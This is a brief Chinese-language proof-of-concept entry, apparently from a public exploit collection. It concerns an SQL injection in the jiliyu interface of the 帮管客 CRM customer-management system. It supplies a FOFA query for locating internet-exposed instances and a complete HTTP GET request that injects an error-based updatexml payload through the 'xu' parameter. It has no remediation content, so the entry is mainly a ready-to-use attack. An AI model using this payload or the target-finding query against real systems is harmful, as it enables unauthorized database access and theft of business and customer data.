## 帮管客CRM-jiliyu接口存在SQL漏洞

帮管客CRM客户管理系统专注于为企业提供crm客户关系管理、crm管理系统、crm软件产品及企业销售管理流程解决方案服务,助力企业业绩增长。帮管客CRM jiliyu接口存在SQL漏洞

## fofa
```
"帮管客-CRM"
```

## poc
```
GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![image](https://github.com/wy876/POC/assets/139549762/3c45eb31-aae1-4dc3-9f96-c1dfa449afbe)
